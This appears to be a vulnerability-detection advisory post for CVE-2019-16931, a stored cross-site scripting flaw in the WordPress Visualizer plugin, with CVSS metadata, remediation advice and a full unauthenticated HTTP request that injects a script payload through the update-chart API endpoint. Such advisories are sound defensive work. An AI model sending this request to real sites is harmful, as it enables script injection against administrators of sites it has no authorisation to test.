---
layout: post
cve_id: CVE-2019-16931
title: WordPress Visualizer <3.3.1 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2019/CVE-2019-16931.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-16931.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  inject malicious scripts into web pages viewed by users, leading to potential data
  theft, session hijacking, or defacement of the affected website.

  '
remediation: 'Update to the latest version of WordPress Visualizer plugin (3.3.1)
  or apply the provided patch to fix the XSS vulnerability.

  '
reference:
- https://wpscan.com/vulnerability/867e000d-d2f5-4d53-89b0-41d7d4163f44
- https://nathandavison.com/blog/wordpress-visualizer-plugin-xss-and-ssrf
- https://wpvulndb.com/vulnerabilities/9893
- https://nvd.nist.gov/vuln/detail/CVE-2019-16931
- https://wordpress.org/plugins/visualizer/#developers
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2019-16931
  cwe-id: CWE-79
  epss-score: 0.01991
  epss-percentile: 0.83175
  cpe: cpe:2.3:a:themeisle:visualizer:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 1
  vendor: themeisle
  product: visualizer
  framework: wordpress
tags:
- cve
- cve2019
- wp-plugin
- wordpress
- wp
- xss
- unauth
- wpscan
- themeisle
- vuln
---

## ðŸ” Vulnerability Description
WordPress Visualizer plugin before 3.3.1 contains a stored cross-site scripting vulnerability via /wp-json/visualizer/v1/update-chart WP-JSON API endpoint. An unauthenticated attacker can execute arbitrary JavaScript when an admin or other privileged user edits the chart via the admin dashboard.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-json/visualizer/v1/update-chart HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/608.2.11 (KHTML, like Gecko) Version/13 Safari/608.2.11
Connection: close
Content-Length: 77
Content-Type: application/json
Accept-Encoding: gzip
{"id": 7, "visualizer-chart-type": "<script>alert(document.domain)</script>"}
```

